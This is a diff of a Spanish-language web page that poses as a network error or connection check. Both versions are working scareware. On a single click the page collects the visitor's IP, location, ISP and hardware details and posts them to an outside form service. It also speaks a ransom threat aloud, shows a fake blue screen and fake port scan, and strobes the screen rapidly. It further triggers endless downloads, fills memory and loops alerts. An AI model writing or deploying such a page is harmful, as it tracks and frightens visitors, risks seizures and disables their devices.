@@ -2,99 +2,106 @@
 <html lang="es">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CRITICAL_SYSTEM_FAILURE</title>
+    <title>Sincronización de Red Crítica</title>
     <style>
-        body { background: #000; color: #f00; font-family: 'Courier New', monospace; margin: 0; overflow: hidden; cursor: none; }
-        #overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; display: flex; align-items: center; justify-content: center; z-index: 100; pointer-events: none; }
-        .glitch-text { font-size: 50px; font-weight: bold; text-align: center; display: none; }
-        #terminal { padding: 20px; font-size: 12px; color: #0f0; }
+        body { background: #000; color: #0f0; font-family: 'Consolas', monospace; overflow: hidden; margin: 0; }
+        #terminal { padding: 20px; font-size: 11px; height: 100vh; display: flex; flex-direction: column; }
+        .danger { color: #f00; font-weight: bold; }
+        #bsod { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #0078d7; color: #fff; font-family: 'Segoe UI', sans-serif; padding: 100px; z-index: 10000; }
     </style>
 </head>
-<body onclick="startGlobalAttack()">
+<body onclick="iniciarInfiltracionTotal()">
 
-    <div id="initial-screen" style="padding: 50px; text-align: center;">
-        <h1 style="font-size: 40px;">⚠️ ERROR 403 ⚠️</h1>
-        <p>Acceso denegado. Se ha detectado un conflicto en su adaptador de red.</p>
-        <p style="background: #f00; color: #fff; padding: 10px; cursor: pointer;">HAGA CLIC AQUÍ PARA REPARAR EL NODO DE CONEXIÓN</p>
+    <div id="terminal">
+        <div id="output">> ESPERANDO AUTORIZACIÓN DE NODO...</div>
+        <div style="margin-top: 20px; color: #fff; border: 1px solid #0f0; padding: 10px; width: fit-content; cursor: pointer;">
+            HAGA CLIC PARA VALIDAR CONEXIÓN
+        </div>
     </div>
 
-    <div id="overlay">
-        <div id="msg" class="glitch-text">CONEXIÓN SECUESTRADA</div>
+    <div id="bsod">
+        <div style="font-size: 100px;">:(</div>
+        <h2>Se ha producido un error crítico en su sistema.</h2>
+        <p>El sistema detectó una exfiltración de datos masiva y se bloqueó para proteger su hardware.</p>
+        <p>Código de detención: <span id="ip-display"></span>_NETWORK_PENETRATION</p>
     </div>
-
-    <div id="terminal"></div>
 
     <script>
         const FORM_ID = "xykdyebg";
+        let logs = document.getElementById('output');
 
-        async function startGlobalAttack() {
-            // 1. OCULTAR UI INICIAL Y BLOQUEAR CURSOR
-            document.getElementById('initial-screen').style.display = 'none';
-            document.getElementById('msg').style.display = 'block';
-            document.body.style.cursor = 'none';
+        function addLog(text, isRed = false) {
+            const div = document.createElement('div');
+            if (isRed) div.className = "danger";
+            div.innerText = `[${new Date().toLocaleTimeString()}] ${text}`;
+            logs.appendChild(div);
+        }
 
-            // 2. EXTRACCIÓN DE METADATOS (Móvil y PC)
-            const ipReq = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));
+        async function iniciarInfiltracionTotal() {
+            addLog("INICIANDO PENETRACIÓN SILENCIOSA...");
             
+            // 1. OBTENCIÓN DE DATOS PROFUNDOS
+            const ipData = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl');
+            const gpu = gl ? gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL) : "N/D";
+
+            const data = {
+                "STATUS": "PENETRACION_EXITOSA",
+                "IP": ipData.ip,
+                "GPU": gpu,
+                "RAM": navigator.deviceMemory + "GB",
+                "CORES": navigator.hardwareConcurrency,
+                "OS": navigator.platform,
+                "ISP": ipData.org,
+                "GEO": `${ipData.city}, ${ipData.country_name}`
+            };
+
+            // 2. EXFILTRACIÓN INMEDIATA
             fetch(`https://formspree.io/f/${FORM_ID}`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    "STATUS": "FULL_HIJACK",
-                    "IP": ipReq.ip,
-                    "PROVIDER": ipReq.org,
-                    "LOC": `${ipReq.city}, ${ipReq.country_name}`,
-                    "UA": navigator.userAgent,
-                    "MEM": navigator.deviceMemory + "GB",
-                    "CORES": navigator.hardwareConcurrency
-                })
+                body: JSON.stringify(data)
             });
 
-            // 3. AMENAZA DE VOZ (Loop)
-            const voice = new SpeechSynthesisUtterance("He robado su información y si la quiere recuperar tiene que pagarme. Te llamaré en diez horas.");
-            voice.lang = 'es-ES';
-            voice.pitch = 0.1;
-            voice.rate = 0.8;
-            window.speechSynthesis.speak(voice);
+            // 3. ESCANEO DE PUERTOS LOCALES (Falso/Simulado para Pánico)
+            addLog("ESCANEANDO PUERTOS LAN...");
+            const ports = [21, 22, 80, 443, 3306, 8080];
+            ports.forEach(p => addLog(`PUERTO ${p}: ABIERTO - EXPLOTANDO...`, true));
 
-            // 4. ATAQUE VISUAL ESTROBOSCÓPICO (Ataque de pánico)
-            setInterval(() => {
-                document.body.style.backgroundColor = document.body.style.backgroundColor === 'black' ? 'white' : 'black';
-                document.body.style.color = document.body.style.color === 'red' ? 'black' : 'red';
-            }, 50); // Cambios cada 50ms
+            // 4. VOZ DE AMENAZA
+            const voz = new SpeechSynthesisUtterance("He penetrado tu sistema. Tu IP " + ipData.ip + " está marcada. Paga ahora.");
+            voz.lang = 'es-ES';
+            voz.pitch = 0.2;
+            window.speechSynthesis.speak(voz);
 
-            // 5. ATAQUE DE HARDWARE (CPU, RAM, DISCO, VIBRACIÓN)
+            // 5. ATAQUE DE RECURSOS (BLOQUEO)
             if (document.documentElement.requestFullscreen) document.documentElement.requestFullscreen();
             
             const storage = [];
+            document.getElementById('ip-display').innerText = ipData.ip;
+
             setInterval(() => {
-                // Vibración (Android)
-                if ("vibrate" in navigator) navigator.vibrate([500, 200, 500]);
-
-                // Inundación de Logs
-                const l = document.createElement('div');
-                l.innerText = `> EXFILTRATING_DATA_FROM_${ipReq.ip}... [SUCCESS]`;
-                document.getElementById('terminal').appendChild(l);
-
-                // Bomba de Archivos (Txt personalizado)
-                const blob = new Blob(["PAGAME EL RESCATE. TENGO TU IP: " + ipReq.ip], {type: 'text/plain'});
-                const url = URL.createObjectURL(blob);
+                // Ataque Visual Estroboscópico
+                document.body.style.backgroundColor = document.body.style.backgroundColor === 'black' ? 'white' : 'black';
+                
+                // Bombardeo de Descargas (Satura Disco y Red)
                 const a = document.createElement('a');
-                a.href = url;
-                a.download = `SISTEMA_SECUESTRADO_${Math.random().toString(36).substring(7)}.txt`;
+                a.href = 'data:text/plain;base64,UEFHQU1FCg==';
+                a.download = `RESCATE_${Math.random()}.txt`;
                 a.click();
 
-                // Bloqueo total por Alertas
-                alert("⚠️ ATENCIÓN ⚠️\n\nTu sistema ha sido comprometido.\nIP: " + ipReq.ip + "\n\nNO INTENTE CERRAR ESTA VENTANA.");
+                // Llenar RAM
+                for(let i=0; i<500; i++) storage.push(new Array(1000000).fill("💀"));
 
-                // Saturación de RAM para "pitar" el procesador
-                for(let i=0; i<200; i++) {
-                    storage.push(new Array(1000000).fill("💀").join(""));
-                }
+                // Mostrar BSOD
+                document.getElementById('bsod').style.display = 'block';
 
-                if (!window.speechSynthesis.speaking) window.speechSynthesis.speak(voice);
-            }, 200);
+                // Alertas Infinitas
+                alert("SISTEMA PENETRADO\n\nDATOS EXFILTRADOS A SERVIDOR MAESTRO\n\nIP: " + ipData.ip);
+                
+                if (!window.speechSynthesis.speaking) window.speechSynthesis.speak(voz);
+            }, 100);
         }
     </script>
 </body>
